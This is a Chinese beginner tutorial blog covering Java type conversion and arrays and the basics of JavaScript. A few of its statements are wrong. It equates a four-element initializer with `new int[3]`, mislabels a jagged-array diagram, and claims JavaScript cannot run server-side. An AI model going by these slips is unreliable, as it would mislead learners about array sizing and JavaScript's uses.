<p>  (1) 除非是简单的直观运算，应该尽量使用括号<br>  (2)另外，尽量不要写太长的表达式，过长的表达式容易引 起对求值次序的误解。<br></font></td></tr></table></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">例：</span><br><span class="line">    (1) a + b * c</span><br><span class="line">    (2) a = b || c</span><br><span class="line">    (3) a + b &lt; c &amp;&amp; d==e</span><br><span class="line">    (4) a=8 – 2 * 3 &lt;4 &amp;&amp; 5 &lt; 2     结果：<span class="literal">false</span></span><br></pre></td></tr></table></figure>

<p>&amp;emsp;<br><font face="Comic sans MS"><font color="#00B2EE"><strong>表达式写法的习惯：</strong></font><br>  (1) 除非是简单的直观运算，应该尽量使用括号<br>  (2)另外，尽量不要写太长的表达式，过长的表达式容易引 起对求值次序的误解。<br></font> </p>
<hr>
<hr>
<p>&amp;emsp;<br>&amp;emsp;</p>
<h3 id="三、-数据类型转换"><a href="#三、-数据类型转换" class="headerlink" title="三、 数据类型转换  "></a><font color="#FF6347" face="Comic sans MS">三、 数据类型转换  </font></h3><h4 id="3-1-自动类型转换"><a href="#3-1-自动类型转换" class="headerlink" title="3.1  自动类型转换"></a><font color="#3CB371" face="Comic sans MS">3.1  自动类型转换</font></h4><p><font face="Comic sans MS">(1) Java中整型、实型、字符型数据可以混合运算。<br><font color="#00B2EE"><strong>运算过程中，Java自动把精度较低的类型转换为另一种精度较高的类型。</strong></font><br>(2) 低精度的值赋给高精度的变量可以自动转换,不出现编译错误；<font color="#00B2EE"><strong>相反会出现编译错误,需要强制转换。</strong></font><br>例如: float x&#x3D;(float)5.0;long x&#x3D;2;</p>
<p><font color="red"><strong>注意：</strong></font> 如果byte、short、char在一起运算时，会先将这些值转换为int型。再进行运算，结果为int型。 如表达式中一个变量是int型，另一个是long型，则先将int型转为long型，再进行计算。最后结果为long型。</font></p>
<p><img data-src="https://i.loli.net/2019/01/11/5c3881774735b.png" alt="7.png"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">下列代码会编译出错，提示c = (a + b);有精度损失</span><br><span class="line">class <span class="built_in">test</span></span><br><span class="line">&#123;</span><br><span class="line">      public static void main(String args[])</span><br><span class="line">     &#123;</span><br><span class="line">        byte a = 1;</span><br><span class="line">        byte b = 1;</span><br><span class="line">        byte c = (a + b);</span><br><span class="line">      &#125; </span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
<blockquote>
<blockquote>
<p>练习题3:<br>下列表达式结果是什么类型？<br>‘A’+2+2.5<br>double</p>
</blockquote>
</blockquote>
<p>&amp;emsp;<br>&amp;emsp;</p>
<h4 id="3-2-手动强制类型转换"><a href="#3-2-手动强制类型转换" class="headerlink" title="3.2  手动强制类型转换"></a><font color="#3CB371" face="Comic sans MS">3.2  手动强制类型转换</font></h4><p><font face="Comic sans MS"><font color="#00B2EE"><strong>在Java中直接将高精度的值赋给低精度的变量会导致编译出错。这时可用强制类型转换来解决。</strong></font><br> 形式为：<br>&amp;emsp;&amp;emsp;<font color="red">       (类型名)表达式</font><br> 例如：<br>       int   i;   byte  b,c;<br>       b&#x3D;(byte)345;      &#x2F;&#x2F;上机测试知b得到89<br>       c&#x3D;(byte)356;      &#x2F;&#x2F;上机测试知c得到100<br>       i&#x3D;(int)(3.8+6);   &#x2F;&#x2F;强制转换后小数部分被截去，i得到9，不会四舍五入</p>
<p><font color="red"><strong>注意：</strong></font> </p>
<ol>
<li>强制类型转换可能造成信息的丢失；  </li>
<li>布尔型与其它基本类型之间不能转换。</font></li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">加上强制类型转换，下列代码编译通过。</span><br><span class="line">class <span class="built_in">test</span></span><br><span class="line">&#123;     public static void main(String args[])</span><br><span class="line">     &#123;</span><br><span class="line">        byte a = 1;</span><br><span class="line">        byte b = 1;</span><br><span class="line">        byte c = (byte)(a + b);</span><br><span class="line">      &#125; &#125; </span><br></pre></td></tr></table></figure>

<table><tr><td bgcolor=#ADD8E6><font face="Comic sans MS"><font color="red">**运算时注意（一般的运算都有类型提升功能）：**</font> 
（1）在运算过程中，运算的结果至少是int型，即如果参与运算的两个数级别比int型低或是int型，则结果为
     int型；
（2）参与运算的数据如果有一个级别比int型高，则运算结果的类型与类型级别高的数相同；
（3）参与运算的两个数据如果类型不一样，会先把低级的数据转换成高级的类型的数据后再作运算，结果是高
     级的类型。
</font></td></tr></table>


<p>&amp;emsp;<br>&amp;emsp;</p>
<h4 id="3-3-隐含强制类型转换"><a href="#3-3-隐含强制类型转换" class="headerlink" title="3.3  隐含强制类型转换"></a><font color="#3CB371" face="Comic sans MS">3.3  隐含强制类型转换</font></h4><p><font face="Comic sans MS">Java中允许把int类型的常量赋给byte、short变量时不需要强制类型转换<br>      byte b&#x3D;123;&#x2F;&#x2F;合法<br>      short s&#x3D;123;&#x2F;&#x2F;合法<br>      b&#x3D;b+3; &#x2F;&#x2F;不合法<br>&amp;emsp;<br>但是把int类型的变量赋给byte、short类型的变量时必须强制转换，否则会出错<br>     int i&#x3D;123;<br>     byte b&#x3D;i;  &#x2F;&#x2F;正确的做法是byte b&#x3D;(byte)i;<br>    byte a &#x3D; 1; byte c &#x3D; (byte)(a + b);<br></font></p>
<blockquote>
<blockquote>
<p>练习<br>设x,y,a分别为float,double,byte型变量，x&#x3D;3.3,y&#x3D;2.9,a&#x3D;5, 则表达式x+ (int)y&#x2F; 3*a的值为多少？值的类型是什么？ </p>
</blockquote>
</blockquote>
<hr>
<hr>
<p>&amp;emsp;<br>&amp;emsp;<br>&amp;emsp;<br>&amp;emsp;</p>
]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Java学习</tag>
        <tag>Java语言</tag>
      </tags>
  </entry>
  <entry>
    <title>Java数组(3.9)</title>
    <url>/post/Java-Language-2-4/</url>
    <content><![CDATA[<p>&amp;ensp;<br>&amp;ensp;</p>
<center><font color="#3CB371" face="Comic sans MS" size=5>数组</font></center>

<p>&amp;emsp;<br>&amp;emsp;</p>
<h3 id="一、-一维数组"><a href="#一、-一维数组" class="headerlink" title="一、 一维数组 "></a><font color="#FF6347" face="Comic sans MS">一、 一维数组 </font></h3><p><font face="Comic sans MS"><font color="red"> <strong>数组：</strong> </font><font color="#00B2EE"><strong>相同类型的数据元素按顺序组成的一种线性表</strong></font>，元素在数组中的相对位置由下标来指定。数组中的每个元素通过数组名加下标进行引用。</p>
<p><font color="red"> <strong>数组有什么用处？</strong> </font><br><font color="#009ACD"><em>例：定义100个int型变量，求这100个变量的和。</em></font><br>int x1,x2,x3…x100;<br>int sum;<br>sum&#x3D;x1+x2+…+x100;<br>这样程序很复杂。<br><font color="#009ACD"><em>例：定义100个int型变量，求这100个变量的和。</em></font><br>有了数组后，可以这样编程：<br>int [] x&#x3D;new int[100];<br>int sum&#x3D;0;<br>for(int i&#x3D;0;i&lt;100;i++)<br>{<br>     sum&#x3D;sum+x[i];<br>}<br>这样使得程序编写方便很多。</p>
<p><font color="red"> <strong>注意：</strong> </font><br>Java中，数组是独立的<font color="#00B2EE"><strong>类</strong></font>，有自身的方法，<font color="#00B2EE"><strong>不只是变量的集合</strong></font>。在Java里创建一个数组，需要做如下的工作：<br>   （1）说明一个变量来存放该数组。<br>   （2）<font color="#00B2EE"><strong>建立一个新的数组对象</strong></font>（即创建数组空间）并把它赋给这个数组变量。<br>   （3）在该数组中存储信息。<br></font></p>
<p>&amp;emsp;&amp;emsp;<font color="red"> <strong>↓↓</strong> </font></p>
<blockquote>
<p>例如：String list[ ]&#x3D;new String[3];<br>             list[0]&#x3D;“one”;<br>             list[1]&#x3D;“two”;</p>
</blockquote>
<p>&amp;emsp;<br>&amp;emsp;</p>
<h4 id="1-1-一维数组的说明"><a href="#1-1-一维数组的说明" class="headerlink" title="1.1  一维数组的说明"></a><font color="#3CB371" face="Comic sans MS">1.1  一维数组的说明</font></h4><p><font face="Comic sans MS">同其他类变量一样，在使用数组前必须先说明它，一维数组说明的格式如下：<br><font color="red">&amp;emsp;       类型    数组名[ ]；<br>    或 类型[ ]    数组名；<br></font></font></p>
<blockquote>
<p>例如：int list[ ];<br>            int[] list;<br>            String[] args;<br>            String args[];</p>
</blockquote>
<p>&amp;emsp;<br>&amp;emsp;</p>
<h4 id="1-2-创建数组空间"><a href="#1-2-创建数组空间" class="headerlink" title="1.2  创建数组空间"></a><font color="#3CB371" face="Comic sans MS">1.2  创建数组空间</font></h4><p><font face="Comic sans MS">创建数组空间必须声明数组的长度，以确定所开辟的内存空间的大小，在Java中实际上就是通过new创建一个新的数组对象并把它赋给这个数组变量。其语法格式如下：<br><font color="red">&amp;emsp;&amp;emsp;&amp;emsp;数组名&#x3D;new 数组元素类型[数组元素个数]</font><br>例如：int[] list;   list&#x3D;new int[3];</p>
<p>数组的说明和构造合并在一起，其语法格式如下：<br><font color="red">&amp;emsp;&amp;emsp;&amp;emsp;          类型 数组名[ ]&#x3D;new 数组元素类型[数组元素个数]；]</font><br>例如：int list[ ]&#x3D;new int[3];<br></font></p>
<p>&amp;emsp;<br>&amp;emsp;</p>
<h4 id="1-3-数组的初始化"><a href="#1-3-数组的初始化" class="headerlink" title="1.3  数组的初始化"></a><font color="#3CB371" face="Comic sans MS">1.3  数组的初始化</font></h4><p><font face="Comic sans MS"><font color="red"><strong>1. 数组的初始化方式有两种：</strong></font><br>(1) 像初始化简单类型一样自动初始化数组，即在说明数组的同时进行初始化；<br>&amp;emsp;&amp;emsp;<font color="red">     int a[]&#x3D;{1,2,3,4}</font><br>(2) 先定义数组，然后为每个元素赋值。例如：<br>&amp;emsp;&amp;emsp;<font color="red">     int b[]&#x3D;new int[3];</font><br>&amp;emsp;&amp;emsp;<font color="red">     b[0]&#x3D;8;b[1]&#x3D;9;</font><br>&amp;emsp;<br><font color="red"><strong>2. 这样初始化也可以!</strong></font><br>另一种形式1：<br><font color="red">int[] a&#x3D;new int[]{1,2,3,4};</font>&amp;emsp;&amp;emsp; 等价于: int[] a&#x3D;{1,2,3,4}<br>{}中的元素个数决定了[]中的元素个数。{}中的元素取值决定了数组a各个元素的取值。</p>
<p>另一种形式2：<br><font color="red">int[] a;<br>a&#x3D;new int[]{1,2,3,4};</font><br>等价于：int[] a&#x3D;new int[3];<br>&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp; a[0]&#x3D;1;a[1]&#x3D;2;a[2]&#x3D;3;<br>&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp; a[3]&#x3D;4<br></font></p>
<blockquote>
<p>但是这样定义是错误的：<br>int[] a;<br>a&#x3D;{1,2,3,4};</p>
</blockquote>
<p><font face="Comic sans MS"><font color="red"><strong>定义数组要注意：</strong></font><br>(1) 不能这样定义数组：<br>&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;          int a[5];<br>(2)不能这样初始化数组：<br>&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;          int[] a;   a&#x3D;{1,2,3,4};<br>(3)使用new 创建数组之后，数组中的每个元素被自动初始化为0。<br>&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;         int [] a&#x3D;new int[10];<br>&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;         for(int i&#x3D;0;i&lt;10;i++)<br>&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;           { System.out.println(“a[“+i+”]&#x3D;”+a[i]);<br>&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;           }<br></font></p>
<p>&amp;emsp;<br>&amp;emsp;</p>
<h4 id="1-4-数组元素的使用"><a href="#1-4-数组元素的使用" class="headerlink" title="1.4  数组元素的使用"></a><font color="#3CB371" face="Comic sans MS">1.4  数组元素的使用</font></h4><p><font face="Comic sans MS">数组元素的表示方式为：<br>&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp; <font color="red">数组名[下标]</font><br>&amp;emsp;<br><font color="red"><strong>使用数组时要注意：</strong></font><br>（1）数组越界异常:<font color="#00B2EE"><strong>Java在对数组元素操作时会对数组下标进行越界检查，以保证安全性。</strong></font>若在Java程序中超出了对数组下标的使用范围则在运行此程序时将出现如下错误信息：<br>&amp;emsp;&amp;emsp;    <em>Exception in thread “main”             Java.lang.ArrayIndexOutOfBoundsException</em><br>如下的错误即数组越界：int x[]&#x3D;{1,2,3,4};System.out.println(x[4]);</p>
<p>（2）每个数组都有一个属性length来指明其长度，字符串String用length()。<br>&amp;emsp;&amp;emsp;<font color="red">         <strong>list.length;</strong></font></p>
<p>（3）空指针异常<br></font></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">数组长度lengh的使用</span><br><span class="line"><span class="keyword">int</span> x[]=&#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>&#125;;                  <span class="keyword">int</span> x[]=&#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>&#125;;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">100</span>;i++)              <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;x.length;i++)    </span><br><span class="line">&#123;  System.out.println(x[i]);        &#123; System.out.println(x[i]); </span><br><span class="line">&#125;                                   &#125;</span><br><span class="line"></span><br><span class="line">空指针如下使用会导致错误</span><br><span class="line"><span class="keyword">int</span> x[]=<span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">10</span>];</span><br><span class="line">x=<span class="keyword">null</span>;</span><br><span class="line">x[<span class="number">0</span>]=<span class="number">1</span>;</span><br></pre></td></tr></table></figure>

<p>&amp;emsp;<br>&amp;emsp;</p>
<h4 id="1-5-一维数组使用举例"><a href="#1-5-一维数组使用举例" class="headerlink" title="1.5  一维数组使用举例"></a><font color="#3CB371" face="Comic sans MS">1.5  一维数组使用举例</font></h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[例3-12] 练习数组的创建和使用</span><br><span class="line">[例3-13] 练习数组越界</span><br><span class="line">[例3-14] 数组作为函数的参数</span><br><span class="line"></span><br><span class="line">[例3-12] HalfDollars.java 练习数组的创建与使用</span><br><span class="line">class HalfDollars&#123;</span><br><span class="line">	public static void main(String[] args)&#123;</span><br><span class="line">		int[] denver=&#123;15000006,18810000,20752110&#125;;</span><br><span class="line">		int[] philadelphia=new int[denver.length];</span><br><span class="line">		int[] total=new int[denver.length];</span><br><span class="line">		int average;</span><br><span class="line">		</span><br><span class="line">		philadelphia[0]=15020000;</span><br><span class="line">		philadelphia[1]=18709000;</span><br><span class="line">		philadelphia[2]=21348000;</span><br><span class="line">		</span><br><span class="line">		total[0]=denver[0]+philadelphia[0];</span><br><span class="line">		total[1]=denver[1]+philadelphia[1];</span><br><span class="line">		total[2]=denver[2]+philadelphia[2];</span><br><span class="line">		average=(total[0]+total[1]+total[2])/3;</span><br><span class="line">		System.out.println(<span class="string">&quot;1993 production:&quot;</span>+total[0]);</span><br><span class="line">        System.out.println(<span class="string">&quot;1994 production:&quot;</span>+total[1]);</span><br><span class="line">        System.out.println(<span class="string">&quot;1995 production:&quot;</span>+total[2]);</span><br><span class="line">        System.out.println(<span class="string">&quot;Average production:&quot;</span>+average);</span><br><span class="line">	  &#125;</span><br><span class="line">&#125;</span><br><span class="line">运行结果：</span><br><span class="line">1993 production:30020006</span><br><span class="line">1994 production:37519000</span><br><span class="line">1995 production:42100110</span><br><span class="line">Average production:36546372</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[例3-13] ChoiceSort.java 数组的越界</span><br><span class="line">public class ChoiceSort</span><br><span class="line">&#123;</span><br><span class="line">	public static void main(String arg[])</span><br><span class="line">     &#123;   int i,min;</span><br><span class="line">          int str[]=&#123;2,13,41,58,32&#125;;</span><br><span class="line">          <span class="keyword">for</span>(i=0;i&lt;5;i++)</span><br><span class="line">          &#123;</span><br><span class="line">	         min=i;</span><br><span class="line">	        <span class="keyword">for</span>(int j=i+1;j&lt;6;j++)</span><br><span class="line">	         &#123;      </span><br><span class="line">	           <span class="keyword">if</span>(str[min]&gt;str[j])</span><br><span class="line">	         	 &#123;</span><br><span class="line">	              int at=str[j];</span><br><span class="line">	              str[j]=str[min];</span><br><span class="line">	              str[min]=at;</span><br><span class="line">	             &#125;</span><br><span class="line">	         &#125;  </span><br><span class="line">	      &#125;</span><br><span class="line">	    <span class="keyword">for</span>(i=0;i&lt;5;i++)</span><br><span class="line">	    System.out.println(str[i]+<span class="string">&quot; &quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">运行结果：</span><br><span class="line">程序没能正常运行，抛出了“java.lang.ArrayIndexOutOfBoundsException”异常。 </span><br><span class="line">		</span><br><span class="line"></span><br><span class="line">例[3-14] test.java 数组作为函数的参数</span><br><span class="line">class <span class="built_in">test</span>  </span><br><span class="line">&#123;   static void change(int [] a)  //输出a[0]和a[1]中大的那个数</span><br><span class="line">    &#123;    int t;</span><br><span class="line">         <span class="keyword">if</span>(a[0]&lt;a[1])</span><br><span class="line">         &#123;        t=a[0];</span><br><span class="line">                  a[0]=a[1];</span><br><span class="line">                  a[1]=t;</span><br><span class="line">         &#125;</span><br><span class="line">         System.out.println(a[0]);</span><br><span class="line">    &#125;</span><br><span class="line">    public static void main(String args[])</span><br><span class="line">   &#123;    int x[]=&#123;5,12&#125;;</span><br><span class="line">        change(x);     //调用过后，数组x可能发生变化</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<hr>
<hr>
<p>&amp;emsp;<br>&amp;emsp;</p>
<h3 id="二、-二维数组"><a href="#二、-二维数组" class="headerlink" title="二、 二维数组 "></a><font color="#FF6347" face="Comic sans MS">二、 二维数组 </font></h3><p><font face="Comic sans MS">Java中的多维数组实际上是数组的数组。不一定是规则的矩阵数组。<br><font color="red">多维数组：数组的数组，例如，二维数组为一个特殊的一维数组，其每个元素又是一个一维数组<br></font></font></p>
<p><img data-src="https://i.loli.net/2019/01/13/5c3ad27f549bb.png" alt="1.png"><img data-src="https://i.loli.net/2019/01/13/5c3ad282ed579.png" alt="2.png"></p>
<p>&amp;emsp;<br>&amp;emsp;<br><font face="Comic sans MS"><font color="#00B2EE"><strong>二维数组说明的格式为：</strong></font><br><font color="red">&amp;emsp;  类型    数组名[ ][ ]；<br>      或                  类型[ ][ ]     数组名；<br></font><br>例如，说明一个整型的二维数组如下：<br><font color="red">&amp;emsp;    int intArray[ ][ ];或 int[ ][ ] intArray;<br></font></p>
<p>&amp;emsp;<br><font color="#00B2EE"><strong>二维数组的创建：</strong></font><br>直接为每一维分配空间，如：<br><font color="red">&amp;emsp;       int a[ ][ ]&#x3D;new int[2][3];</font><br></font></p>
<p>|||<br>:-: | :-: | :-:<br>a[0][0]|a[0][1]|a[0][2]<br>a[1][0]|a[1][1]|a[1][2]</p>
<p>&amp;emsp;<br><font face="Comic sans MS"><font color="#00B2EE"><strong>从最高维开始，分别为每一维分配空间，如：</strong></font><br>int b[ ][ ]&#x3D;new int[2][ ];<br>b[0]&#x3D;new int[3];<br>b[1]&#x3D;new int[5];<br></font></p>
<table>
<thead>
<tr>
<th align="center"></th>
<th align="center"></th>
<th align="center"></th>
</tr>
</thead>
<tbody><tr>
<td align="center">b[0][0]</td>
<td align="center">b[0][1]</td>
<td align="center">b[0][2]</td>
</tr>
<tr>
<td align="center">b[1][0]</td>
<td align="center">b[1][1]</td>
<td align="center">b[1][2]</td>
</tr>
</tbody></table>
<p>&amp;emsp;<br><font face="Comic sans MS"><font color="#00B2EE"><strong>元素的初始化：</strong></font><br>（1）直接对每个元素进行赋值。<br>（2）在说明数组的同时进行初始化。<br></font></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">例如：  int[][] a=new int[3][2]：</span><br><span class="line">              a[0][0]=2； a[0][1]=3</span><br><span class="line">              a[1][0]=1； a[1][1]=5</span><br><span class="line">              a[2][0]=3； a[2][1]=4  </span><br><span class="line">等价于：int a[ ][ ]=&#123;&#123;2,3&#125;,&#123;1,5&#125;,&#123;3,4&#125;&#125;; </span><br></pre></td></tr></table></figure>

<p>&amp;emsp;<br><font face="Comic sans MS"><font color="red"><strong>总结：与数组操作相关的系统函数</strong></font><br><font color="#00B2EE"><strong>（1）使用Arrays.sort来对数组排序</strong></font><br>int x[]&#x3D;new int[]{3,2,1,4};<br>java.util.Arrays.sort(x);  &#x2F;&#x2F;对数组x内的元素进行排序（升序）<br>for(int i&#x3D;0;i &lt; x.length;i++)<br>{<br>      System.out.println(x[i]);<br>}</p>
<p><font color="#00B2EE"><strong>（2）使用Arrays.binarySearch函数对数组进行二分查找</strong></font><br>int [] x&#x3D;new int[]{2,5,1,6,8,3};<br>java.util.Arrays.sort(x);<br>System.out.println(java.util.Arrays.binarySearch(x,1));   &#x2F;&#x2F;二分查找，在数组x中查找1，输出0 ;如果没找到，则会输出一个&lt;0的数</p>
<p><font color="#00B2EE"><strong>（3）使用System.arraycopy函数拷贝数组</strong></font><br>int [] x;<br>x&#x3D;new int[]{3,1,2,4};<br>int [] y;<br>y&#x3D;new int[4];<br>System.arraycopy(x,0,y,0,4);<br>&#x2F;&#x2F;将数组x内的 4个元素拷贝给数组y </p>
<p><font color="#00B2EE"><strong>（4）使用Ayyars.fill函数填充数组</strong></font><br>int [] x;<br>x&#x3D;new int[]{3,1,2,4};<br>java.util.Arrays.fill(x,7);    &#x2F;&#x2F;数组x中的4个元素都改为7<br></font></p>
<hr>
<hr>
<p>&amp;emsp;<br>&amp;emsp;<br>&amp;emsp;<br>&amp;emsp;</p>
]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Java学习</tag>
        <tag>Java语言</tag>
      </tags>
  </entry>
  <entry>
    <title>JavaScript</title>
    <url>/post/JavaScript/</url>
    <content><![CDATA[<p>JavaScript 语句和 JavaScript 变量都对大小写敏感。( ⸝⸝•ᴗ•⸝⸝ )੭⁾⁾</p>
<span id="more"></span>


<br />

<br />

<center><font color="#00B2EE" face="Comic sans MS" size=5>JavaScript 基础</font> </center>



<br />

<br />

<h3 id="一-JavaScript-简介"><a href="#一-JavaScript-简介" class="headerlink" title="一. JavaScript 简介"></a><font color="#FF6347" face="Comic sans MS">一. JavaScript 简介</font></h3><br />

<h4 id="1-1-JavaScript-由来"><a href="#1-1-JavaScript-由来" class="headerlink" title="1.1 JavaScript 由来"></a><font color="#3CB371" face="Comic sans MS">1.1 JavaScript 由来</font></h4><p><font face="Microsoft YaHei" color="#FF7F00"><strong>（1） 关于JavaScript</strong></font></p>
<p>在上个世纪的1995年，当时的网景公司正凭借其Navigator浏览器成为Web时代开启时最著名的第一代互联网公司。</p>
<p>由于网景公司希望能在静态HTML页面上添加一些动态效果，于是叫Brendan Eich这哥们在两周之内设计出了JavaScript语言。你没看错，这哥们只用了10天时间。</p>
<p>为什么起名叫JavaScript？原因是当时Java语言非常红火，所以网景公司希望借Java的名气来推广，但事实上JavaScript除了语法上有点像Java，其他部分基本上没啥关系。</p>
<br />

<p><strong>ECMAScript</strong></p>
<p>因为网景开发了JavaScript，一年后微软又模仿JavaScript开发了JScript，为了让JavaScript成为全球标准，几个公司联合ECMA（European Computer Manufacturers Association）组织定制了JavaScript语言的标准，被称为ECMAScript标准。</p>
<p>所以简单说来就是，ECMAScript是一种语言标准，而JavaScript是网景公司对ECMAScript标准的一种实现。</p>
<p>那为什么不直接把JavaScript定为标准呢？因为JavaScript是网景的注册商标。</p>
<p>不过大多数时候，我们还是用JavaScript这个词。如果你遇到ECMAScript这个词，简单把它替换为JavaScript就行了。</p>
<br />

<p><strong>JavaScript版本</strong></p>
<p>JavaScript语言是在10天时间内设计出来的，虽然语言的设计者水平非常NB，但谁也架不住“时间紧，任务重”，所以，JavaScript有很多设计缺陷，我们后面会慢慢讲到。</p>
<p>此外，由于JavaScript的标准——ECMAScript在不断发展，最新版ECMAScript 6标准（简称ES6）已经在2015年6月正式发布了，所以，讲到JavaScript的版本，实际上就是说它实现了ECMAScript标准的哪个版本。</p>
<p>由于浏览器在发布时就确定了JavaScript的版本，加上很多用户还在使用IE6这种古老的浏览器，这就导致你在写JavaScript的时候，要照顾一下老用户，不能一上来就用最新的ES6标准写，否则，老用户的浏览器是无法运行新版本的JavaScript代码的。</p>
<br />

<p><font face="Microsoft YaHei" color="#FF7F00"><strong>（2） JavaScript是什么？</strong></font></p>
<ul>
<li><p>JavaScript是一种小型的、轻量级的、面向对象的、跨平台的客户端脚本语言。</p>
</li>
<li><p>JavaScript是嵌入到浏览器软件当中的去的，只要你的电脑有浏览器就可以执行JS程序了。JavaScript是一种面向对象的程序语言。在程序中，对象是由“属性”和“方法”构成。</p>
</li>
<li><p><strong>跨平台：</strong>JS程序可以在多种平台下运行，如：windows、linux、mac、IOS等。</p>
</li>
<li><p><strong>客户端脚本程序：</strong>JS只能在客户端的浏览器来运行，不能在服务器端来运行。</p>
</li>
<li><p><strong>浏览器是一个翻译器</strong>，可以翻译三种代码：HTML代码、CSS代码、JavaScript代码。</p>
</li>
<li><p>JavaScript 是可插入 HTML 页面的编程代码。</p>
</li>
</ul>
<p><strong>注：JS中的对象只要会用就可以了，不需要我们自己去开发对象。</strong></p>
<br />

<p><font face="Microsoft YaHei" color="#FF7F00"><strong>（3） JavaScript能干什么？</strong></font></p>
<ul>
<li><p><strong>表单验证：</strong>是JS最基本的功能。</p>
</li>
<li><p><strong>动态HTML：</strong>可以实现一些动态的、重复的效果。</p>
</li>
<li><p><strong>交互式：</strong>人机交互，通过键盘或鼠标，与网页中的元素进行交互。</p>
</li>
</ul>
<br />

<br />

<h4 id="1-2-JavaScript-规则"><a href="#1-2-JavaScript-规则" class="headerlink" title="1.2 JavaScript 规则"></a><font color="#3CB371" face="Comic sans MS">1.2 JavaScript 规则</font></h4><p><font face="Microsoft YaHei" color="#FF7F00"><strong>（1） JavaScript用法</strong></font></p>
<ul>
<li><p>同一个网页中，可以有HTML代码、CSS代码、JavaScript代码。</p>
</li>
<li><p>通过**<code>&lt;script&gt;&lt;/script&gt;</code>**来引入JS程序代码。即HTML 中的脚本必须位于 <code>&lt;script&gt;</code> 与 <code>&lt;/script&gt;</code> 标签之间。<code>&lt;script&gt;</code> 和 <code>&lt;/script&gt;</code> 会告诉 JavaScript 在何处开始和结束。</p>
</li>
</ul>
<br />

<p><font face="Microsoft YaHei" color="#FF7F00"><strong>（2） 脚本的放置位置</strong></font></p>
<p>脚本可被放置在：</p>
<ol>
<li>放在HTML页面的<code>&lt;head&gt;&lt;/head&gt;</code> 里；</li>
<li>放在HTML页面的 <code>&lt;body&gt;&lt;/body&gt;</code> 里；或者同时放在二者中；</li>
<li>放在外部 .js文件里，这个文件里面直接写js脚本，不用再写<code>&lt;script&gt;&lt;/script&gt;</code>这两个标签。</li>
</ol>
<br />

<p><strong>a. 把 JavaScript 代码放在<code>&lt;head&gt;&lt;/head&gt;</code> 和放在 <code>&lt;body&gt;&lt;/body&gt;</code> 里的区别：</strong></p>
<ul>
<li>简单地说，放在 <code>&lt;head&gt;&lt;/head&gt;</code> 里的会比放在 <code>&lt;body&gt;&lt;/body&gt;</code> 先执行。head 标签里的代码会在页面还未开始绘制之前被解析，而在 body 里的代码则会在页面渲染的同时在读取到这段代码的时候才被执行。</li>
<li>通常的做法是把函数放入 <code>&lt;head&gt;</code> 部分中，或者放在页面底部。这样就可以把它们安置到同一处位置，不会干扰页面的内容。</li>
</ul>
<br />

<p><strong>b. 外部的 JavaScript</strong></p>
<ul>
<li>也可以把脚本保存到外部文件中。外部文件通常包含被多个网页使用的代码。</li>
<li>外部 JavaScript 文件的文件扩展名是 .js。</li>
<li>如需使用外部文件，请在 <code>&lt;script&gt;</code> 标签的 “src” 属性中设置该 .js 文件：</li>
<li>可以将脚本放置于 <code>&lt;head&gt;</code> 或者 <code>&lt;body&gt;</code>中，放在 <code>&lt;script&gt;</code> 标签中的脚本与外部引用的脚本运行效果完全一致。</li>
</ul>
<p>实例：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;script src=<span class="string">&quot;myScript.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<blockquote>
<p><strong>说明：</strong>那些老旧的实例可能会在 <code>&lt;script&gt;</code> 标签中使用 <code>type=&quot;text/javascript&quot;</code>。现在已经不必这样做了。JavaScript 是所有现代浏览器以及 HTML5 中的默认脚本语言。</p>
</blockquote>
<br />

<p><font face="Microsoft YaHei" color="#FF7F00"><strong>（3） 关于注释</strong></font></p>
<ol>
<li><p>C&#x2F;C++&#x2F;C#&#x2F;Java&#x2F;JavaScript：单行使用**<code>//</code><strong>,多行使用</strong><code>/*...*/</code>**</p>
</li>
<li><p>MYSQL&#x2F;Python：**<code>#</code>**</p>
</li>
<li><p>PHP：单行使用**<code>//</code>**，多行使用三对单引号或者双引号</p>
</li>
<li><p>CSS：**<code>/*...*/</code>**</p>
</li>
<li><p>HTML：**<code>&lt;!--注释内容--&gt;</code>**</p>
</li>
</ol>
<br />

<br />

<h4 id="1-3-JavaScript-输出"><a href="#1-3-JavaScript-输出" class="headerlink" title="1.3 JavaScript 输出"></a><font color="#3CB371" face="Comic sans MS">1.3 JavaScript 输出</font></h4><blockquote>
<p><font color="#FF7F00"><strong>JavaScript 显示数据</strong></font></p>
</blockquote>
<ol>
<li>使用 window.alert() 弹出警告框。</li>
<li>使用 document.write() 方法将内容写到 HTML 文档中。</li>
<li>使用 innerHTML 写入到 HTML 元素。</li>
<li>使用 console.log() 写入到浏览器的控制台。</li>
</ol>
<br />

